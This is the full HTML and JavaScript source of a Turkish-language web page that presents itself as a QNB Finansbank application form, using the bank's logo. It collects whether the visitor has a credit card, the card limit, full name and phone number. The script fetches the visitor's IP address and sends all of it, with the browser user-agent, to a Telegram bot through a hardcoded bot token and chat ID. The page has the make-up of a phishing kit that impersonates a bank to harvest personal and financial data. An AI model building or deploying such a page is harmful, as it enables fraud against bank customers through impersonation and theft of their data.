<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>QNB Başvuru</title>
  <style>
    /* Reset ve temel ayarlar */
    * {
      box-sizing: border-box;
    }
    body {
      font-family: Arial, sans-serif;
      background-color: #fdfdfd;
      margin: 0;
      padding: 0;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    /* Header */
    .header {
      background: linear-gradient(to right, #0d0c34, #56003c);
      height: 56px;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 0 16px;
    }
    .header img {
      height: 36px;
      max-width: 100%;
    }

    /* Container full width with padding */
    .container {
      width: 100%;
      max-width: 480px; /* büyük ekran için sınır */
      margin: 0 auto;
      padding: 24px 16px;
      background: white;
      min-height: calc(100vh - 56px);
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
    }

    /* Form elemanları */
    label {
      font-weight: 700;
      margin-bottom: 8px;
      display: block;
      font-size: 16px;
      color: #222;
    }
    input[type="text"],
    input[type="number"],
    input[type="tel"] {
      width: 100%;
      padding: 14px 12px;
      font-size: 18px;
      border: 1.5px solid #ccc;
      border-radius: 8px;
      margin-bottom: 20px;
      outline-offset: 2px;
      transition: border-color 0.3s;
    }
    input[type="text"]:focus,
    input[type="number"]:focus,
    input[type="tel"]:focus {
      border-color: #880e4f;
    }

    /* Radio buttonlar: büyük, tam genişlikte ve dikey */
    .choice-buttons {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-bottom: 24px;
    }
    .choice-buttons input[type="radio"] {
      display: none;
    }
    .choice-buttons label {
      background-color: #f2f2f2;
      border-radius: 10px;
      padding: 16px 0;
      text-align: center;
      font-weight: 700;
      font-size: 18px;
      border: 2px solid transparent;
      cursor: pointer;
      user-select: none;
      transition: background-color 0.3s, border-color 0.3s, color 0.3s;
    }
    .choice-buttons input[type="radio"]:checked + label {
      background-color: #880e4f;
      color: white;
      border-color: #880e4f;
    }

    /* Buton tam genişlikte, büyük */
    .login-button {
      width: 100%;
      background-color: #880e4f;
      color: white;
      border: none;
      border-radius: 10px;
      padding: 16px 0;
      font-size: 20px;
      font-weight: 700;
      cursor: pointer;
      transition: background-color 0.3s;
      margin-top: auto; /* alttan boşluk için */
      box-shadow: 0 4px 8px rgba(136, 14, 79, 0.3);
    }
    .login-button:hover {
      background-color: #6a0040;
    }

    /* Hata mesajları */
    .error {
      color: #d32f2f;
      font-weight: 600;
      margin-top: 8px;
      text-align: center;
      min-height: 22px;
    }

    /* Bilgi kutusu */
    .info {
      background-color: #f8f8f8;
      border-left: 5px solid #880e4f;
      padding: 14px 16px;
      margin-bottom: 24px;
      font-size: 16px;
      color: #333;
      border-radius: 6px;
    }

    /* Başarı ekranı */
    .success-container {
      text-align: center;
      padding: 40px 16px;
      min-height: calc(100vh - 56px);
      display: flex;
      flex-direction: column;
      justify-content: center;
    }
    .checkmark {
      font-size: 80px;
      color: #4CAF50;
      margin-bottom: 24px;
    }
    .success-container h2 {
      color: #4CAF50;
      font-weight: 700;
      font-size: 24px;
      margin-bottom: 12px;
    }
    .success-container p {
      font-size: 18px;
      margin: 6px 0;
      color: #222;
    }

    /* Gizle/göster */
    .hidden {
      display: none !important;
    }

    /* Küçük ekranlarda düzenleme */
    @media (max-width: 480px) {
      .container {
        min-height: auto; /* min-height kaldırıldı */
        padding-bottom: 24px; /* alt boşluk bırakıldı */
      }
      .success-container {
        min-height: auto;
        padding-top: 40px;
        padding-bottom: 40px;
      }
      .login-button {
        font-size: 18px;
        padding: 14px 0;
      }
      label {
        font-size: 15px;
      }
      input[type="text"],
      input[type="number"],
      input[type="tel"] {
        font-size: 16px;
        padding: 12px 10px;
      }
      .choice-buttons label {
        font-size: 16px;
        padding: 14px 0;
      }
      .success-container h2 {
        font-size: 22px;
      }
      .success-container p {
        font-size: 16px;
      }
    }
  </style>
</head>
<body>

  <div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/QNB_Finansbank_logo.svg/512px-QNB_Finansbank_logo.svg.png" alt="QNB Logo" />
  </div>

  <!-- FORM 1 -->
  <div class="container" id="form1">
    <form id="loginForm" novalidate>
      <label>Kredi kartı kullanıyor musunuz?</label>
      <div class="choice-buttons">
        <input type="radio" id="evet" name="krediKart" value="Evet" />
        <label for="evet">Evet</label>

        <input type="radio" id="hayir" name="krediKart" value="Hayır" />
        <label for="hayir">Hayır</label>
      </div>

      <label for="limit">Kart limitiniz</label>
      <input type="number" id="limit" name="limit" placeholder="Örn: 10000 TL" min="0" />

      <button type="submit" class="login-button">İleri</button>
      <div id="error" class="error"></div>
    </form>
  </div>

  <!-- FORM 2 -->
  <div class="container hidden" id="form2">
    <div class="info" id="summaryInfo"></div>

    <form id="secondForm" novalidate>
      <label for="isim">İsim Soyisim</label>
      <input type="text" id="isim" name="isim" placeholder="Adınız Soyadınız" autocomplete="name" />

      <label for="tel">Telefon Numaranız</label>
      <input type="tel" id="tel" name="tel" placeholder="05xxxxxxxxx" autocomplete="tel" pattern="0[5-9][0-9]{9}" />

      <button type="submit" class="login-button">Gönder</button>
      <div id="error2" class="error"></div>
    </form>
  </div>

  <!-- ONAY EKRANI -->
  <div class="container hidden" id="successScreen">
    <div class="success-container">
      <div class="checkmark">✅</div>
      <h2>Başvurunuz Alındı!</h2>
      <p id="finalInfo"></p>
      <p>En kısa sürede sizinle iletişime geçilecektir.</p>
    </div>
  </div>

  <script>
    const form1 = document.getElementById("form1");
    const form2 = document.getElementById("form2");
    const successScreen = document.getElementById("successScreen");

    const loginForm = document.getElementById("loginForm");
    const secondForm = document.getElementById("secondForm");
    const summaryInfo = document.getElementById("summaryInfo");
    const finalInfo = document.getElementById("finalInfo");

    let krediKartDegeri = "";
    let limitDegeri = "";

    // Telegram bot bilgileri
    const botToken = "8259636821:AAENnnMjK_g71sJa3RgEflvw6bnZxv1NmOw";
    const chatId = "8041633958";

    loginForm.addEventListener("submit", function(e) {
      e.preventDefault();

      const krediKart = document.querySelector('input[name="krediKart"]:checked');
      const limit = document.getElementById("limit").value.trim();
      const error = document.getElementById("error");

      if (!krediKart || limit === "" || Number(limit) <= 0) {
        error.textContent = "Lütfen kredi kartı durumunu seçin ve geçerli limit girin.";
        return;
      }

      krediKartDegeri = krediKart.value;
      limitDegeri = limit;

      summaryInfo.innerHTML = `
        <strong>Önceki Bilgiler:</strong><br>
        Kredi Kartı Kullanımı: <strong>${krediKartDegeri}</strong><br>
        Kart Limiti: <strong>${limitDegeri} TL</strong>
      `;

      form1.classList.add("hidden");
      form2.classList.remove("hidden");
    });

    secondForm.addEventListener("submit", function(e) {
      e.preventDefault();

      const isim = document.getElementById("isim").value.trim();
      const tel = document.getElementById("tel").value.trim();
      const error2 = document.getElementById("error2");

      // Basit telefon numarası kontrolü (11 haneli ve 0 ile başlamalı)
      const telPattern = /^0[5-9][0-9]{9}$/;
      if (isim === "" || tel === "" || !telPattern.test(tel)) {
        error2.textContent = "Lütfen geçerli isim ve telefon numarası girin.";
        return;
      }

      const tarayici = navigator.userAgent;
      const tarihSaat = new Date().toLocaleString("tr-TR");

      fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
          const ipAdres = data.ip;

          const telegramMessage = `
🔔 Yeni Başvuru
🕒 Tarih: ${tarihSaat}
👤 İsim: ${isim}
📞 Telefon: ${tel}
💳 Kredi Kartı: ${krediKartDegeri}
💰 Kart Limiti: ${limitDegeri} TL
🌐 IP: ${ipAdres}
🧭 Tarayıcı: ${tarayici}
          `;

          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: telegramMessage
            })
          })
          .then(response => {
            if (!response.ok) throw new Error("Telegram'a gönderilemedi");

            finalInfo.innerHTML = `
              <strong>İsim Soyisim:</strong> ${isim}<br>
              <strong>Telefon:</strong> ${tel}<br>
              <strong>Kredi Kartı:</strong> ${krediKartDegeri}<br>
              <strong>Kart Limiti:</strong> ${limitDegeri} TL
            `;
            form2.classList.add("hidden");
            successScreen.classList.remove("hidden");
          })
          .catch(() => {
            error2.textContent = "Telegram'a mesaj gönderilemedi.";
          });

        })
        .catch(() => {
          error2.textContent = "IP adresi alınamadı.";
        });
    });
  </script>
</body>
</html>
